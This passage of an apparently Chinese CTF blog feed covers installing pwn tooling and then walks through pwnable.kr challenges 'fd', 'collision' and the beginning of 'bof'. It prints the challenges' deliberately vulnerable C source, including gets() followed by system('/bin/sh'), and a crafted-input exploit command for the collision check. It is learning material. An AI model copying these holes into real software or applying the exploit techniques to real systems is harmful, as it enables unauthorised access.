clone https://github.com/Gallopsled/pwntools-binutils</span><br><span class="line">cd ubuntu</span><br><span class="line">chmod +x install_all.sh</span><br><span class="line">./install_all.sh arm #your architecture</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center"><strong>成功安装</strong></th><th style="text-align:center"><strong>未成功安装</strong></th></tr></thead><tbody><tr><td style="text-align:center">binutils-aarch64-linux-gnu</td><td style="text-align:center">binutils-arm-linux-gnu</td></tr><tr><td style="text-align:center">binutils-alpha-linux-gnu</td><td style="text-align:center">binutils-avr-linux-gnu</td></tr><tr><td style="text-align:center">binutils-hppa-linux-gnu</td><td style="text-align:center">binutils-cris-linux-gnu</td></tr><tr><td style="text-align:center">binutils-m68k-linux-gnu</td><td style="text-align:center">binutils-ia64-linux-gnu</td></tr><tr><td style="text-align:center">binutils-mips-linux-gnu</td><td style="text-align:center">binutils-mips64-linux-gnu</td></tr><tr><td style="text-align:center">binutils-powerpc-linux-gnu</td><td style="text-align:center">binutils-msp430-linux-gnu</td></tr><tr><td style="text-align:center">binutils-powerpc64-linux-gnu</td><td style="text-align:center">binutils-s390-linux-gnu</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">binutils-sparc-linux-gnu</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">binutils-vax-linux-gnu</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">binutils-xscale-linux-gnu</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">binutils-i386-linux-gnu</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">binutils-x86_64-linux-gnu</td></tr></tbody></table><p>没安装的我在这个网站搜了一下也没搜到。<a href="https://packages.ubuntu.com/" target="_blank" rel="noopener">https://packages.ubuntu.com/</a></p><h3 id="安装Python-Dev-Python-Development-Headers"><a href="#安装Python-Dev-Python-Development-Headers" class="headerlink" title="安装Python-Dev(Python Development Headers)"></a>安装Python-Dev(Python Development Headers)</h3><blockquote><p><code>Python-Dev介绍</code><br>python-dev或python-devel称为是python的开发包，其中包括了一些用C/Java/C#等编写的python扩展在编译的时候依赖的头文件等信息。比如我们在编译一个用C语言编写的python扩展模块时，因为里面会有#include<python.h>等这样的语句，因此我们就需要先安装python-devel开发包。</python.h></p></blockquote><p>一些Pwntools的Python依赖项需要本地扩展，所以必须要安装Python-Dev.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev</span><br></pre></td></tr></table></figure><p>可能会无法安装，依赖问题，用aptitude替换apt-get进行安装，成功安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo aptitude install python-dev</span><br></pre></td></tr></table></figure><h3 id="安装Pwntools"><a href="#安装Pwntools" class="headerlink" title="安装Pwntools"></a>安装Pwntools</h3><div class="github-widget" data-repo="Gallopsled/pwntools"></div><p><code>github下载安装</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools</span><br><span class="line">cd pwntools</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p><code>pip安装</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">#可以看到有些前面已经装过了，这是我复制pwntools手册上的</span><br><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential   </span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>如果没报错，进入python终端，输入import pwn，然后回车，没报错应该就是安装好了<br>现在尝试一下pwntools的asm功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pwn.asm(&quot;xor eax,eax&quot;)</span><br><span class="line">&apos;1\xc0&apos;</span><br></pre></td></tr></table></figure><p>如果有正确输出，即说明这个功能是可以用的，到这里就算安装完成。</p><h3 id="gdb-peda-pwndbg安装"><a href="#gdb-peda-pwndbg安装" class="headerlink" title="gdb+peda+pwndbg安装"></a>gdb+peda+pwndbg安装</h3><blockquote><p><code>gdb介绍</code><br>GDB（GNU Debugger）GNU开发的Unix/Linux下的调试工具。其功能强大，现描述如下：<br>GDB主要帮忙你完成下面四个方面的功能：<br>1.启动你的程序，可以按照你的自定义的要求随心所欲的运行程序。<br>2.可让被调试的程序在你所指定的调置的断点处停住。（断点可以是条件表达式）<br>3.当程序被停住时，可以检查此时你的程序中所发生的事。<br>4.动态的改变你程序的执行环境。<br>gdb不同于windows下的ollydbg和windbg，它是命令行下的工具，没有图形界面，通过输入命令与它交互，来调试程序，查看程序的运行过程,这一点和windbg有点相似。也是很多致力于安全研究、漏洞发现的人的一个神器。</p></blockquote><p>Ubuntu16.04是默认安装了gdb的，可以使用gdb –version查看gdb的版本，如果没有安装可以使用下面一条命令进行安装，也可以编译安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb</span><br></pre></td></tr></table></figure><blockquote><p><code>peda介绍</code><br>peda全称是Python Exploit Development Assistance for GDB。PEDA是为GDB设计的一个强大的插件它提供了很多人性化的功能，比如高亮显示反汇编代码、寄存器、内存信息，提高了debug的效率。同时，PEDA还为GDB添加了一些实用新的命令，比如checksec可以查看程序开启了哪些安全机制等等。它是用Python写的一个工具，可以辅助编写exp,运行在Unix/Linux系统上。</p></blockquote><div class="github-widget" data-repo="longld/peda"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#安装peda</span><br><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line">echo &quot;DONE! debug your program with gdb and enjoy&quot;</span><br></pre></td></tr></table></figure><p>peda也可以通过<code>pip</code>安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install pip</span><br></pre></td></tr></table></figure></p><blockquote><p><code>pwndbg介绍</code><br>Pwndbg是一个Python模块，它直接加载到GDB中，并提供了一套实用工具和一组辅助工具来绕过GDB的所有cruft，并将粗糙的边缘平滑掉。过去的许多其他项目(如gdbinit、PEDA)和现在(例如GEF)的存在填补了这些空白。它们都提供了优秀的经验和优秀的特性——但是它们很难扩展(有些是未维护的，所有的都是单个100KB、200KB或300KB文件)。Pwndbg的存在不仅是为了取代它的所有前辈，而且还有一个快速运行的干净的实现。</p></blockquote><p>Pwndbg支持最好的环境是: <code>Ubuntu14.04 and GDB7.7</code>  <code>Ubuntu16.04 and GDB7.11</code></p><div class="github-widget" data-repo="pwndbg/pwndbg"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#安装Pwndbg</span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>这些工具的用法打算另写一篇文章，不然这篇文章实在是太长了。</p><h3 id="安装gcc-multilib"><a href="#安装gcc-multilib" class="headerlink" title="安装gcc-multilib"></a>安装gcc-multilib</h3><blockquote><p><code>gcc-multilib</code><br>gcc-multilib是Debian的64位系统下运行32位程序的一个库，装了这个库就可以运行32位的程序了。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#安装命令</span><br><span class="line">sudo apt-get install gcc-multilib   或者</span><br><span class="line">sudo aptitude install gcc-multilib</span><br></pre></td></tr></table></figure><h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><blockquote><p><code>socat</code><br>socat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的加强版,socat是两个独立数据通道之间的双向数据传输的继电器。这些数据通道包含文件、管道、设备（终端或调制解调器等）、插座（Unix，IP4，IP6 - raw，UDP，TCP）、SSL、SOCKS4客户端或代理CONNECT。Socat支持广播和多播、抽象Unix sockets、Linux tun/tap、GNU readline 和 PTY。它提供了分叉、记录和进程间通信的不同模式。多个选项可用于调整socat和其渠道，Socat可以作为TCP中继（一次性或守护进程），作为一个守护进程基于socksifier，作为一个shell Unix套接字接口，作为IP6的继电器，或面向TCP的程序重定向到一个串行线。socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式：ip, tcp, udp, ipv6, pipe,exec,system,open,proxy,openssl,socket等。(文档英文的看起来太困难，这是别人写的，也不知道对不对，以后)</p></blockquote><p>Ubuntu16.04下默认安装有，如果没有，需要安装的话，看了别人的文章，好像要下载源码编译安装。</p><h3 id="安装rp"><a href="#安装rp" class="headerlink" title="安装rp++"></a>安装rp++</h3><blockquote><p><code>rp++</code><br>rp++是一种完全用c++编写的工具，目的是在PE/Elf/Mach-O(不支持FAT二进制文件)x86/x64二进制文件中找到ROP序列。它是开源的，已经在几个操作系统上测试过:Debian / Windows 7 / FreeBSD / Mac OSX Lion(10.7.3)。此外，它是x64兼容的。我差点忘了，它同时处理英特尔和英特尔。</p></blockquote><div class="github-widget" data-repo="0vercl0k/rp"></div><p><a href="https://github.com/0vercl0k/rp/downloads" target="_blank" rel="noopener">下载链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#运行</span><br><span class="line">chmod +x rp-lin-x64</span><br><span class="line">./rp-lin-x64</span><br></pre></td></tr></table></figure><h3 id="安装ROPgadget"><a href="#安装ROPgadget" class="headerlink" title="安装ROPgadget"></a>安装ROPgadget</h3><blockquote><p><code>ROPgadget介绍</code><br>这个工具可以让你在二进制文件上搜索的小工具，以方便你的ROP利用。ROPgadget支持x86、x64、ARM、ARM64、PowerPC、SPARC和MIPS体系结构的ELF/PE/Mach-O格式。从版本5开始,ROPgadget有一个新的核心，它是用Python的Capstone disassembly框架编写的，用于gadget搜索引擎——旧版本可以在存档目录中找到，但它不会被维护。</p></blockquote><div class="github-widget" data-repo="JonathanSalwan/ROPgadget"></div><p>安装ROPgadget之前需要先安装Capstone,这个反汇编框架之前已经安装过了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#方法一</span><br><span class="line">#安装过capstone后，ROPgadget可以作为一个单独的工具使用</span><br><span class="line">ROPgadget.py</span><br><span class="line">#方法二</span><br><span class="line">#安装到Python的站点包库中，并且加入环境变量中</span><br><span class="line">python setup.py install</span><br><span class="line">ROPgadget</span><br><span class="line">#方法三</span><br><span class="line">#用pip安装</span><br><span class="line">pip install ropgadget</span><br><span class="line">ROPgadget</span><br></pre></td></tr></table></figure><h3 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h3><blockquote><p><code>libc-database介绍</code><br>libc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。libc-database是github上的一个仓库，可以进行服务器上所用函数库版本的识别。</p></blockquote><div class="github-widget" data-repo="niklasb/libc-database"></div><p>这里还有一个更全的，是一个网站。<code>libcdb.com</code></p><p>写到这总算告一段落了，如果后期还有更好的工具，我会补充，就先到这吧。</p>]]></content>
      
      <categories>
          
          <category> 备忘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Ubuntu </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwnable.kr</title>
      <link href="/2018/03/23/pwnable.kr/"/>
      <url>/2018/03/23/pwnable.kr/</url>
      <content type="html"><![CDATA[<blockquote><p>开始入坑Pwn,此篇博文记录在pwnable.kr网站上做题的过程和在做题过程中遇到的新的知识点的学习！<br><a id="more"></a></p></blockquote><h2 id="Toddler’s-Bottle"><a href="#Toddler’s-Bottle" class="headerlink" title="[Toddler’s Bottle]"></a>[Toddler’s Bottle]</h2><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><blockquote><p><strong>题目描述:</strong><br>Mommy! what is a file descriptor in Linux?<br>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial<br>link: <a href="https://www.youtube.com/watch?v=blAxTfcW9VU" target="_blank" rel="noopener">https://www.youtube.com/watch?v=blAxTfcW9VU</a><br>ssh fd@pwnable.kr -p2222 (pw:guest)</p></blockquote><h4 id="0x00-题目分析"><a href="#0x00-题目分析" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>通过题目名称和题目描述可知,此题与Linux下文件的描述有关系。题目还给了一个ssh连接账号和密码,先连接一下看看。</p><div align="left"><br>    <img src="/resources/2018/2018-03-23-00.png" alt="登录成功"><br></div><blockquote><p><strong>知识点一</strong> Linux系统文件描述fd(file descriptor)</p></blockquote><h4 id="0x01-查看文件及权限"><a href="#0x01-查看文件及权限" class="headerlink" title="0x01 查看文件及权限"></a>0x01 查看文件及权限</h4><p>再看看当前目录下有什么文件,发现了三个文件,fd、fd.c、flag,并且看到当前用户对于flag文件没有读权限。</p><div align="left"><br>    <img src="/resources/2018/2018-03-23-01.png" alt="查看文件"><br></div><blockquote><p><strong>知识点二</strong> Linux文件权限</p></blockquote><h4 id="0x02-分析fd-c"><a href="#0x02-分析fd-c" class="headerlink" title="0x02 分析fd.c"></a>0x02 分析fd.c</h4><p>查看fd.c内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先分析一下这段代码,main()函数有三个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">****************************main()原型*******************************</span><br><span class="line"><span class="number">1.</span> argc  指命令行输入参数的个数(编译器根据用户输入计算,程序名称也算在里面)</span><br><span class="line"><span class="number">2.</span> argv  存储命令行输入的参数(多个参数用空格分隔,以<span class="literal">NULL</span>结束)</span><br><span class="line"><span class="number">3.</span> env   存储了系统的环境变量</span><br><span class="line">********************************************************************</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* env[] )</span></span></span><br></pre></td></tr></table></figure><blockquote><p>1.要想拿到flag,执行system(“/bin/cat flag”)<br>2.就要使if(!strcmp(“LETMEWIN\n”, buf))的条件为真<br>3.那么就要使strcmp(“LETMEWIN\n”,buf)返回0,也就是buf=”LETMEWIN\n”<br>4.buf中的值是从fd中读出来的<br>5.atoi(表示 ascii to integer)是把字符串转换成整型数的一个函数<br>6.当argv[1]=”4660”时,fd=0.表示从键盘读入数据存放到buf中,因为在Linux系统将所有设备都当作文件来处理,当fd=0时就是把键盘当做一个文件</p></blockquote><div align="center"><strong>Linux标准文件描述符</strong></div><table><thead><tr><th style="text-align:center">文件描述符</th><th style="text-align:center">缩写</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">STDIN</td><td style="text-align:center">标准输入</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">STDOUT</td><td style="text-align:center">标准输出</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">STDERR</td><td style="text-align:center">标准错误输出</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">****************************read()原型*******************************</span><br><span class="line">read from a file descriptor</span><br><span class="line"><span class="number">1.</span> fd    文件描述符，用来指向要操作的文件的文件结构体</span><br><span class="line"><span class="number">2.</span> buf   读上来的数据保存在缓冲区buf中</span><br><span class="line"><span class="number">3.</span> count 请求读取的字节数</span><br><span class="line">********************************************************************</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br><span class="line">函数的返回值说明：</span><br><span class="line">(<span class="number">1</span>)如果成功，返回读取的字节数(字符串结束符 <span class="string">'\0'</span>不算);</span><br><span class="line">(<span class="number">2</span>)如果出错，返回<span class="number">-1</span>并设置errno;</span><br><span class="line">(<span class="number">3</span>)如果在调read函数之前已是文件末尾，则返回<span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="0x03-拿取flag"><a href="#0x03-拿取flag" class="headerlink" title="0x03 拿取flag"></a>0x03 拿取flag</h4><div align="left"><br>    <img src="/resources/2018/2018-03-23-02.png" alt="flag"><br></div><h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><blockquote><p><strong>题目描述:</strong><br>Daddy told me about cool MD5 hash collision today.<br>I wanna do something like that too!<br>ssh col@pwnable.kr -p2222 (pw:guest)</p></blockquote><h4 id="0x00-题目分析-1"><a href="#0x00-题目分析-1" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>由题目可知,这道题是一个与MD5哈希碰撞有关的题目。和上一道题一样,给出了SSH登录账号和密码,依旧登录一下。登陆成功,当前用户是col</p><div align="left"><br>    <img src="/resources/2018/2018-03-23-03.png" alt="登陆成功"><br></div><h4 id="0x01-查看文件权限"><a href="#0x01-查看文件权限" class="headerlink" title="0x01 查看文件权限"></a>0x01 查看文件权限</h4><p>依旧和第一题相似，本题用户对flag文件依旧没有读取权限，当前用户目录一共有三个文件，col、col.c、flag</p><div align="left"><br>    <img src="/resources/2018/2018-03-23-04.png" alt="查看文件权限"><br></div><h4 id="0x02-分析col-c"><a href="#0x02-分析col-c" class="headerlink" title="0x02 分析col.c"></a>0x02 分析col.c</h4><p>查看col.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码开始的时候定义了一个hashcode,有一个check_password()函数,可知要求输入一个password进行比对, 再看看主函数和上题很像，有argc和argv[]两个参数，由此可知password将在执行这段代码的时候跟在程序名称后面传入程序中。</p><p>当没有传入参数时，显示此段程序的usage<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由下面这段程序可知,输入的参数的长度为20字节时,才会执行if语句里的system(“/bin/cat flag”),输出flag<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>再来看看check_password()函数,传入的参数是一个char型的字符数组,在函数里面通过int<em> ip = (int</em>)p将char型的字符数组转换成int型的字符数组,20个字节的字符数组就变成拥有5个元素的int型数组,通过for循环进行累加,得到的值与hashcode进行比对。<br>对20个字节，要构造输入的整型转换后的5个整数求和 == 0x21DD09EC，<br>第一个想法是：前16个字节赋\x00，最后4个字节为0xEC09DD21，但是\x09是HTab，输入会被阻断。<br>第二个想法：前16个字节赋\x01，最后4个字节为\xE8\x05\xD9\x1D，嗯，就这样。<br>0x01010101*4+0x1DD905E8=0x21DD09EC</p></blockquote><h4 id="0x03-拿取flag-1"><a href="#0x03-拿取flag-1" class="headerlink" title="0x03 拿取flag"></a>0x03 拿取flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c &quot;print &apos;\x01&apos; * 16 + &apos;\xE8\x05\xD9\x1D&apos;&quot;`</span><br></pre></td></tr></table></figure><p>解释一下这段命令,在bash中,$( )与` `（反引号）都是用来作命令替换的。命令替换与变量替换差不多，都是用来重组命令行的，先完成引号里的命令行，然后将其结果替换出来，再重组成新的命令行。-c 参数，直接运行python语句,用print语句打印出构造好的20个字节。然后将输出的20个字节数据传进col,进行验证，得到flag</p><div align="left"><br>    <img src="/resources/2018/2018-03-23-05.png" alt="flag"><br></div><h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><blockquote><p><strong>题目描述</strong><br>Nana told me that buffer overflow is one of the most common software vulnerability.<br>Is that true?<br>Download : <a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a><br>Download : <a href="http://pwnable.kr/bin/bof.c" target="_blank" rel="noopener">http://pwnable.kr/bin/bof.c</a><br>Running at : nc pwnable.kr 9000</p></blockquote><h4 id="0x00-题目分析-2"><a href="#0x00-题目分析-2" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>有题目可知这是一道和<code>缓冲区溢出</code>有关的题目。题目给了两个文件，先来看看两个文件的信息吧。</p><h4 id="0x01-bof-amp-bof-c"><a href="#0x01-bof-amp-bof-c" class="headerlink" title="0x01 bof&amp;bof.c"></a>0x01 bof&amp;bof.c</h4><p>先用file命令查看一下<code>bof</code>的文件信息</p><div align="left"><br>    <img src="/resources/2018/2018-04-18-00.png" alt="bof"><br></div><p>由得出的信息可以知道Linux下一个32bit的ELF文件。再查看一下<code>bof.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">    gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 